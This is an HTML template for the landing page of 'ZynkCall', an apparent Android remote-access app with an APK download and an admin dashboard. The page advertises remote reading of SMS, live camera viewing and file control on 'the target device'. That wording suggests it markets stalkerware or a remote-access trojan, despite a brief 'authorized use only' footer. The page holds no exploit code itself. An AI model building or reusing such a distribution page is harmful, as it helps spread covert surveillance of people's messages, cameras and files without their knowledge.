<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZynkCall | Secure Remote Access</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
</head>
<body class="bg-slate-950 text-white font-sans">

    <nav class="p-6 flex justify-between items-center max-w-7xl mx-auto">
        <div class="text-2xl font-bold tracking-tighter text-indigo-500">
            <i class="fa-solid fa-satellite-dish mr-2"></i>ZYNKCALL
        </div>
        <div class="space-x-6">
            <a href="/admin/login" class="hover:text-indigo-400 transition">Login</a>
            {{-- <a href="/register" class="bg-indigo-600 px-5 py-2 rounded-full font-medium hover:bg-indigo-700 transition">Get Started</a> --}}
        </div>
    </nav>

    <header class="py-20 px-6 text-center max-w-4xl mx-auto">
        <h1 class="text-5xl md:text-7xl font-extrabold mb-6 bg-gradient-to-r from-indigo-400 to-purple-400 bg-clip-text text-transparent">
            Your Device, <br>Remote Controlled.
        </h1>
        <p class="text-gray-400 text-lg md:text-xl mb-10">
            Seamlessly access SMS, Camera, and Files from any browser. Secure, encrypted, and built for total device management.
        </p>
        <div class="flex flex-col md:flex-row justify-center gap-4">
            <a href="/download-apk" class="bg-white text-black px-8 py-4 rounded-xl font-bold flex items-center justify-center hover:bg-gray-200 transition">
                <i class="fa-brands fa-android text-2xl mr-3"></i> Download APK
            </a>
            <a href="/admin/login" class="bg-slate-900 border border-slate-800 px-8 py-4 rounded-xl font-bold hover:bg-slate-800 transition">
                Open Dashboard
            </a>
        </div>
    </header>

    <section class="py-20 px-6 max-w-7xl mx-auto">
        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
            <div class="bg-slate-900/50 p-8 rounded-3xl border border-slate-800 hover:border-indigo-500/50 transition">
                <div class="w-12 h-12 bg-indigo-500/10 rounded-lg flex items-center justify-center text-indigo-500 mb-6">
                    <i class="fa-solid fa-message text-2xl"></i>
                </div>
                <h3 class="text-xl font-bold mb-3">SMS Management</h3>
                <p class="text-gray-400">Read, send, and backup text messages remotely with real-time sync.</p>
            </div>

            <div class="bg-slate-900/50 p-8 rounded-3xl border border-slate-800 hover:border-indigo-500/50 transition">
                <div class="w-12 h-12 bg-purple-500/10 rounded-lg flex items-center justify-center text-purple-500 mb-6">
                    <i class="fa-solid fa-camera text-2xl"></i>
                </div>
                <h3 class="text-xl font-bold mb-3">Live Camera</h3>
                <p class="text-gray-400">Access front or back cameras to see what's happening in real-time.</p>
            </div>

            <div class="bg-slate-900/50 p-8 rounded-3xl border border-slate-800 hover:border-indigo-500/50 transition">
                <div class="w-12 h-12 bg-blue-500/10 rounded-lg flex items-center justify-center text-blue-500 mb-6">
                    <i class="fa-solid fa-file-shield text-2xl"></i>
                </div>
                <h3 class="text-xl font-bold mb-3">File Explorer</h3>
                <p class="text-gray-400">Download, upload, or delete files on the target device securely.</p>
            </div>
        </div>
    </section>

    <footer class="border-t border-slate-900 py-10 text-center text-gray-500 text-sm">
        <p>&copy; 2026 ZynkCall. For authorized use only.</p>
    </footer>

</body>
</html>
